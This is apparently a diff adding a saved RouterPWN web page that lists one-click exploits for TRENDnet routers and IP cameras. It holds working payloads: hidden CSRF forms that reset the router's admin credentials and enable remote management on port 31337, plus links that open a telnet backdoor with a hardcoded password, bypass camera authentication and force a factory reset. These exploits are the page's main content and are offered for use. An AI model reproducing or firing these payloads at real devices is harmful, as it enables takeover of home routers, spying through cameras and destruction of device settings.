@@ -1,0 +1,329 @@
+<!DOCTYPE html>
+<html>
+ <head>
+  <title>
+   RouterPWN - TRENDnet - One click exploits, News, Vulnerabilities, POC, Alerts
+  </title>
+  <link href="includes/images/favicon.png" rel="apple-touch-icon"/>
+  <link href="includes/images/favicon.ico" rel="shortcut icon"/>
+  <script src="../includes/jquery-1.11.1.min.js">
+  </script>
+  <script src="../includes/jquery.dataTables.min.js">
+  </script>
+  <link href="../includes/jquery.dataTables.css" rel="stylesheet"/>
+  <link href="../includes/menu.css" rel="stylesheet"/>
+ </head>
+ <body>
+  <table align="center" cellspacing="0" style="background-image:url(../includes/images/headerbeta.jpg); background-position:center 0px; background-repeat:no-repeat; " width="925">
+   <tbody>
+    <tr>
+     <td>
+      <center>
+       <img src="../includes/images/logo.gif"/>
+      </center>
+     </td>
+    </tr>
+    <tr>
+     <td>
+      <section class="container">
+       <nav>
+        <ul class="nav">
+         <li>
+          &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+         </li>
+         <li class="active">
+          <a href="/" title="Latest updates by brand">
+           Home
+          </a>
+         </li>
+         <li>
+          <a href="/Generators" title="Online key generators and algorithms">
+           Generators
+          </a>
+         </li>
+         <li>
+          <a href="/Tools" title="Free tools for router hacking">
+           Tools
+          </a>
+         </li>
+         <li>
+          <a href="/Contribute" title="Contribute to Routerpwn.com">
+           Contribute
+          </a>
+         </li>
+         <li>
+          <a href="https://twitter.com/routerpwn" title="Follow Routerpwn updates on Twitter">
+           Follow
+          </a>
+         </li>
+         <li>
+          <a href="/Contact" title="Contact us">
+           Contact
+          </a>
+         </li>
+         <li>
+          <a href="/About" title="About Routerpwn.com">
+           About
+          </a>
+         </li>
+         <li>
+          &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+         </li>
+        </ul>
+       </nav>
+      </section>
+     </td>
+    </tr>
+    <tr>
+     <td>
+      <section id="trendnet">
+       <h1>
+        TRENDnet
+       </h1>
+       <table cellspacing="0" class="display" id="tabla" width="100%">
+        <thead>
+         <tr>
+          <th>
+           Date
+          </th>
+          <th>
+           Category
+          </th>
+          <th>
+           Source
+          </th>
+          <th>
+           Title
+          </th>
+          <th>
+           Author
+          </th>
+         </tr>
+        </thead>
+        <tfoot>
+         <tr>
+          <th>
+           Date
+          </th>
+          <th>
+           Category
+          </th>
+          <th>
+           Source
+          </th>
+          <th>
+           Title
+          </th>
+          <th>
+           Author
+          </th>
+         </tr>
+        </tfoot>
+        <tbody>
+         <form action="http://192.168.10.1/setSysAdm.cgi" id="trendCSRF" method="post" name="trendCSRF">
+          <input name="page" type="hidden" value="/adm/management.asp"/>
+          <input name="admuser" type="hidden" value="admin"/>
+          <input name="admpass" type="hidden" value="password"/>
+          <input name="AuthTimeout" type="hidden" value="600"/>
+         </form>
+         <form action="http://192.168.10.1/uapply.cgi" id="trendCSRF2" method="post" name="trendCSRF2">
+          <input name="page" type="hidden" value="/adm/management.asp"/>
+          <input name="remote_en" type="hidden" value="1"/>
+          <input name="http_wanport" type="hidden" value="31337"/>
+          <input name="action" type="hidden" value="Apply"/>
+          <input name="apply_do" type="hidden" value="setRemoteManagement"/>
+         </form>
+         <tr>
+          <td>
+           08/13/13
+          </td>
+          <td>
+           One click
+          </td>
+          <td>
+           <a href="http://securityevaluators.com/content/case-studies/routers/Vulnerability_Catalog.pdf">
+            securityevaluators.com
+           </a>
+          </td>
+          <td>
+           <a href="http://192.168.10.1/backdoor?password=j78G-DFdg_24Mhw3">
+            TEW 812DRU TEW-692GR TEW-691GR Enable Telnet Backdoor
+           </a>
+           <a href="javascript:setip('/backdoor?password=j78G-DFdg_24Mhw3')">
+            [SET IP]
+           </a>
+          </td>
+          <td>
+           Author
+          </td>
+         </tr>
+         <tr>
+          <td>
+           08/13/13
+          </td>
+          <td>
+           One click
+          </td>
+          <td>
+           <a href="http://securityevaluators.com/content/case-studies/routers/Vulnerability_Catalog.pdf">
+            securityevaluators.com
+           </a>
+          </td>
+          <td>
+           <a href="javascript:trend23pwn()">
+            TEW 812DRU CSRF Enable remote telnet
+           </a>
+           <a href="javascript:trend23pwn()">
+            [SET IP]
+           </a>
+          </td>
+          <td>
+           Author
+          </td>
+         </tr>
+         <tr>
+          <td>
+           08/13/13
+          </td>
+          <td>
+           One click
+          </td>
+          <td>
+           <a href="http://securityevaluators.com/content/case-studies/routers/Vulnerability_Catalog.pdf">
+            securityevaluators.com
+           </a>
+          </td>
+          <td>
+           <a href="javascript:document.trendCSRF.submit()">
+            TEW 812DRU CSRF Change Admin Credentials
+           </a>
+           <a href="javascript:trendCSRF()">
+            [SET IP]
+           </a>
+          </td>
+          <td>
+           Author
+          </td>
+         </tr>
+         <tr>
+          <td>
+           08/13/13
+          </td>
+          <td>
+           One click
+          </td>
+          <td>
+           <a href="http://securityevaluators.com/content/case-studies/routers/Vulnerability_Catalog.pdf">
+            securityevaluators.com
+           </a>
+          </td>
+          <td>
+           <a href="javascript:document.trendCSRF2.submit()">
+            TEW 812DRU CSRF Enable Remote Management
+           </a>
+           <a href="javascript:trendCSRF2()">
+            [SET IP]
+           </a>
+          </td>
+          <td>
+           Author
+          </td>
+         </tr>
+         <tr>
+          <td>
+           01/10/12
+          </td>
+          <td>
+           One click
+          </td>
+          <td>
+           <a href="http://console-cowboys.blogspot.com.au/2012/01/trendnet-cameras-i-always-feel-like.html">
+            console-cowboys.blogspot.com.au
+           </a>
+          </td>
+          <td>
+           <a href="http://192.168.10.30/anony/mjpg.cgi">
+            TV-IP Cameras authentication bypass
+           </a>
+           <a href="javascript:setip('/anony/mjpg.cgi')">
+            [SET IP]
+           </a>
+          </td>
+          <td>
+           Author
+          </td>
+         </tr>
+         <tr>
+          <td>
+           02/26/08
+          </td>
+          <td>
+           One click
+          </td>
+          <td>
+           <a href="http://www.gnucitizen.org/projects/router-hacking-challenge/">
+            www.gnucitizen.org
+           </a>
+          </td>
+          <td>
+           <a href="http://192.168.10.1/Basic/Wireless.shtml">
+            TEW-633GR A-to-C authentication bypass
+           </a>
+           <a href="javascript:setip('/Basic/Wireless.shtml')">
+            [SET IP]
+           </a>
+          </td>
+          <td>
+           Author
+          </td>
+         </tr>
+         <tr>
+          <td>
+           02/26/08
+          </td>
+          <td>
+           One click
+          </td>
+          <td>
+           <a href="http://www.gnucitizen.org/projects/router-hacking-challenge/">
+            www.gnucitizen.org
+           </a>
+          </td>
+          <td>
+           <a href="http://192.168.10.1/reboot.cgi?reset=true">
+            TEW-633GR unauthorized factory reset
+           </a>
+           <a href="javascript:setip('/reboot.cgi?reset=true')">
+            [SET IP]
+           </a>
+          </td>
+          <td>
+           Author
+          </td>
+         </tr>
+        </tbody>
+       </table>
+      </section>
+      <script>
+       $(document).ready(function() {
+    $('#tabla').dataTable( {
+        "order": [[ 0, "desc" ]]
+    } );
+} );
+      </script>
+      <script type="text/javascript">
+       var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
+document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.js' type='text/javascript'%3E%3C/script%3E"));
+      </script>
+      <script type="text/javascript">
+       try {
+var pageTracker = _gat._getTracker("UA-16172640-1");
+pageTracker._trackPageview();
+} catch(err) {}
+      </script>
+     </td>
+    </tr>
+   </tbody>
+  </table>
+ </body>
+</html>
